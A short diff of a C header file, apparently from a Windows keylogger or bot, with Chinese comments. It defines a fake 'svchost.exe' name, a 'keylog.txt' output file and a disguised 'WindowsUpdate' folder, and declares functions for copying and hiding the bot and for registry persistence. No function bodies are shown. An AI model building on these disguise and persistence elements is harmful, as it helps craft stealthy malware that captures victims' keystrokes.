@@ -33,10 +33,10 @@
 #define RECONNECT_INTERVAL 5000 // 单位：毫秒
 #define LONG_SLEEP_INTERVAL 1000*60*60*1 // 1小时
 #define MAX_PATH_LEN 512
+#define PING_TIMEOUT 300
 
 
 // 隐藏文件夹路径
-#define HIDDEN_FOLDER L"\\WindowsUpdate"  // 直接放在 AppData\\Local 下
 #define TARGET_EXE_NAME L"svchost.exe"
 #define OUT_FILE L"keylog.txt"
 
@@ -131,6 +131,7 @@ int copy_and_hide_bot();
 int is_hidden_bot();
 void get_appdata_path(wchar_t* path, size_t len);
 int create_hidden_directory(const wchar_t* path);
+int delete_registry_persistence();
 
 
 
